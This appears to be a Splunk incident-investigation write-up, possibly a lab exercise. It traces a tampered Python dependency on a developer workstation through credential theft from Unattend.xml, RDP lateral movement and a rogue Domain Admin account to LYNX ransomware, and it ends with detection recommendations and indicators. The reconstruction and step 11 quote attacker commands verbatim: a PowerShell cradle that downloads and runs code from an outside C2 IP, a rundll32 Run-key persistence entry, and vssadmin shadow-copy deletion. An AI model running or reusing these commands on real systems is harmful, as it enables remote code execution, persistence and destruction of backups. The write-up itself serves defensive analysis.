# Poisoned PyTorch Dependency — Supply Chain Compromise to Domain-Wide LYNX Ransomware

**Type:** Full Intrusion Investigation (Supply Chain Compromise → Ransomware)
**Platform:** Splunk (SPL)
**Environment:** Windows domain — PC01, DC01, FILE-SERVER-01, BACKUP-SERVER-0
**Log Sources:** Sysmon, Windows Security Event Log, process/PowerShell telemetry, VirusTotal (enrichment)
**Outcome:** Confirmed — a tampered third-party Python dependency led to silent code execution, persistence, a failed privilege-escalation attempt, credential theft, domain compromise, and LYNX ransomware deployed across three hosts.

## Scenario

On 2 February 2026 (UTC), a developer at UNUCORB ran a model-training script from VS Code on PC01. A trusted third-party Python dependency in the project had been tampered with, triggering silent code execution and giving the attacker a foothold on the workstation. Objective: reconstruct the intrusion timeline, determine initial access, track lateral movement across the domain, and identify pre-encryption behavior through ransomware impact.

## Scope

- Hosts: PC01 (dev workstation), DC01 (domain controller), FILE-SERVER-01, BACKUP-SERVER-0
- Initial account: `UNUCORB\michelvic`
- Compromised path: `domain.admin` (recovered from Unattend.xml)
- Rogue account created: `welsam` (display name: welsam maslew)
- Ransomware: LYNX

## Attack Chain

```
Tampered Python dependency executed via train.py (PC01)
        |
PowerShell download cradle — 1s later, parent: python.exe (C2: 54.93.78.216/a)
        |
Obfuscated PowerShell loop (-EncodedCommand), self-spawning, 01:25-01:54
        |
DLL persistence via Registry Run key (updlate.dll)
        |
Failed WSL privilege-escalation attempt
        |
Unattend.xml → cleartext domain.admin credentials
        |
RDP lateral movement → DC01
        |
Masquerading binary (systern.exe) + rogue Domain Admin account (welsam)
        |
RDP expansion → FILE-SERVER-01, second-stage payload (C2: 54.93.78.216/b)
        |
Volume Shadow Copies deleted (vssadmin)
        |
LYNX ransomware deployed — DC01 (04:30:36), BACKUP-SERVER-0 (04:31:06), FILE-SERVER-01
```

## Timeline

| Time (UTC)          | Event                                | Notes                                                             |
|-----------------------|----------------------------------------|----------------------------------------------------------------------|
| 01:17:00             | `train.py` executed                   | PC01, spawned from the VS Code Python chain                         |
| 01:17:01             | First PowerShell download cradle      | Parent: `python.exe` — `...DownloadString('http://54.93.78.216/a')` |
| 01:18:10             | Cradle re-run                         | Same command repeated                                                |
| 01:25–01:54          | Obfuscated PowerShell loop            | `-nop -exec bypass -EncodedCommand`, self-spawning                   |
| 01:47:22             | `updlate.dll` dropped + Run key set   | `AppData\Roaming\updlate.dll`, persistence via `Run\Updater`         |
| 01:54:53–01:58:58    | WSL privilege-escalation attempts     | `wsl -u root` — failed                                                |
| TBD*                  | Unattend.xml discovered               | Cleartext `domain.admin` credentials                                 |
| 03:01:09             | RDP: PC01 → DC01                      | Logon Type 10, using `domain.admin`                                  |
| TBD*                  | `systern.exe` dropped/executed        | DC01, masquerading as `system.exe`                                   |
| 03:15:18             | Rogue account `welsam` created        | EventCode 4720                                                        |
| 03:15:31             | `welsam` → Domain Admins              | EventCode 4728                                                        |
| 03:15:51             | `welsam` → RDP Users                  |                                                                        |
| 04:17:07             | RDP: PC01 → FILE-SERVER-01            | Logon Type 10                                                        |
| 04:37:54             | Second-stage download                 | `http://54.93.78.216/b`                                              |
| TBD*                  | Shadow copies deleted                 | `vssadmin.exe`, pre-ransomware prep                                  |
| 04:30:36             | LYNX ransomware executed              | DC01 — `system recovery.exe`                                         |
| 04:31:06             | LYNX ransomware executed              | BACKUP-SERVER-0 — `system recovery.exe`                              |
| 04:39:40–04:39:41    | Ransomware file activity confirmed    | FILE-SERVER-01, Sysmon T1574.010                                     |

*No exact timestamp recovered from available telemetry — placed by causal order, not assumed.

## Investigation

**1. Initial execution (PC01).** `train.py` runs under the project's Python 3.12 interpreter, spawned via the VS Code integrated environment. The execution chain includes the Jedi language-server component (`jedilsp 3.12.9`) — legitimate tooling, but the tampered instance in this specific chain.

![SPL query — Python process activity on PC01](screenshots/01a-query.png)
![train.py execution confirmed](screenshots/01b-trainpy.png)

**2. PowerShell download cradle.** One second after `train.py`, `powershell.exe` launches directly from `python.exe` — the parent-process link that confirms causality rather than assuming it: `IEX (New-Object Net.WebClient).DownloadString('http://54.93.78.216/a')`. The same command re-fires at 01:18:10, then a heavily obfuscated `-EncodedCommand` loop runs from 01:25 to 01:54, spawning from `powershell.exe` itself.

![PowerShell download cradle, python.exe → powershell.exe](screenshots/02-powershell-cradle.png)

**3. Persistence.** `updlate.dll` dropped to `C:\Users\michelvic\AppData\Roaming\` at 01:47:22, SHA-256 confirmed. Persistence set via `HKU\...\Run\Updater` → `rundll32.exe "...\updlate.dll",StartW`.

![DLL creation event, SHA-256 confirmed](screenshots/03a-dll-creation.png)
![Registry Run key persistence](screenshots/03b-registry-run-key.png)

**4. Failed privilege escalation — WSL.** Attacker checks for `bash.exe`/`wsl.exe` (01:54:53, 01:55:03), runs `wsl whoami`, then attempts `wsl -u root` (01:56:47). Escalation failed.

![WSL discovery and escalation attempt](screenshots/04-wsl-privesc-attempt.png)

**5. Credential access.** Filesystem reconnaissance turned up `Unattend.xml` with cleartext `domain.admin` credentials — the pivot from local compromise to domain-level access.

**6. Lateral movement to DC01.** RDP session at 03:01:09 using `domain.admin`, EventCode 4624, Logon Type 10 (RemoteInteractive).

**7. Masquerading binary.** `systern.exe` staged on DC01 via `Explorer.EXE`, then executed — named to resemble `system.exe`.

**8. Domain Admin backdoor.** Account `welsam` created (4720), added to Domain Admins (4728) 13 seconds later, then to RDP Users 20 seconds after that.

**9. Expansion to file infrastructure.** RDP to FILE-SERVER-01 confirmed at 04:17:07, EventCode 4624, Logon Type 10.

![RDP to FILE-SERVER-01, Logon Type 10](screenshots/09-rdp-to-file-server.png)

**10. Second-stage payload.** A second PowerShell download cradle fires at 04:37:54 from the same C2, path `/b` this time. The surrounding events on this host — `Import-Module ...Ec2Launch-Wallpaper.psd1` — are the server's normal EC2 startup script, not attacker activity; worth separating from the actual cradle when reading the raw table.

![FILE-SERVER-01 PowerShell activity, including the second-stage cradle](screenshots/10-file-server-second-stage.png)

**11. Recovery destruction.** `vssadmin.exe delete shadows /all /quiet` and `/for=C: /quiet`, followed by `vssadmin list shadows` — classic pre-ransomware shadow-copy wipe.

**12. Ransomware deployment.** `system recovery.exe` executes from `C:\Users\domain.admin\Documents\` — confirmed on DC01 at 04:30:36 and BACKUP-SERVER-0 at 04:31:06.

![Ransomware process creation — DC01, BACKUP-SERVER-0](screenshots/12a-process-creation.png)
![Ransomware process creation, continued](screenshots/12b-process-creation-cont.png)

**13. Attribution.** Sysmon logs the same binary touching print-spooler files on FILE-SERVER-01 at 04:39:40–41 (rule T1574.010), SHA-256 confirmed. VirusTotal flags the hash 65/71 malicious, popular threat label `ransomware.incransom/imps`, family labels `incransom`, `imps`, `lynx` — confirming **LYNX ransomware**.

![Sysmon file-write event, SHA-256 confirmed](screenshots/13a-sysmon-hash.png)
![VirusTotal detection — LYNX ransomware](screenshots/13b-virustotal.png)

## Root Cause & Impact

A tampered third-party Python dependency in an AI/ML project directory achieved silent code execution during a routine script run — the download cradle fired one second after `train.py`, spawned directly from `python.exe`, leaving little room to mistake it for unrelated activity. From there, a Windows deployment artifact (Unattend.xml) with exposed cleartext credentials turned a single-host compromise into full domain compromise within roughly two hours, ending in a Domain Admin backdoor, destroyed recovery points, and ransomware across three hosts.

## Recommendations

- Verify third-party Python dependencies (hash/signature pinning) before execution in ML dev environments.
- Alert on `powershell.exe` spawned directly from `python.exe` or other scripting-language interpreters — rare in legitimate workflows, high-fidelity signal here.
- Remove or restrict access to Unattend.xml and other deployment artifacts that may contain cleartext credentials post-provisioning.
- Alert on rapid account-creation → Domain Admins → RDP Users sequences.
- Alert on `vssadmin` shadow-copy deletion as a near-certain ransomware precursor.
- Monitor/restrict WSL usage and flag PowerShell invocations using `-EncodedCommand`/`-nop`/`-exec bypass`.

## Indicators

| Type                  | Value                                                                 |
|------------------------|--------------------------------------------------------------------|
| Compromised user       | UNUCORB\michelvic                                                    |
| Persistence DLL        | `updlate.dll` — SHA-256: `0829B7E5ABE2BAA6D7D001D4B69221D273D377C5E359E7A9C44F4D7A8EB214A0` |
| Persistence key        | `HKU\...\Run\Updater` → `rundll32.exe updlate.dll,StartW`            |
| C2                      | `54.93.78.216` — stage 1 URI `/a` (PC01), stage 2 URI `/b` (FILE-SERVER-01) |
| Recovered credentials  | `domain.admin` (via Unattend.xml)                                    |
| Masquerading binary     | `systern.exe` (mimics `system.exe`)                                  |
| Rogue account           | `welsam` (welsam maslew) — Domain Admins, RDP Users                  |
| Ransomware binary       | `system recovery.exe`                                                 |
| Ransomware hash         | SHA-256: `EAA0E773EB593B0046452F420B6DB8A47178C09E6DB0FA68F6A2D42C3F48E3BC` |
| Ransomware family       | LYNX (VirusTotal 65/71, family labels: incransom, imps, lynx)        |
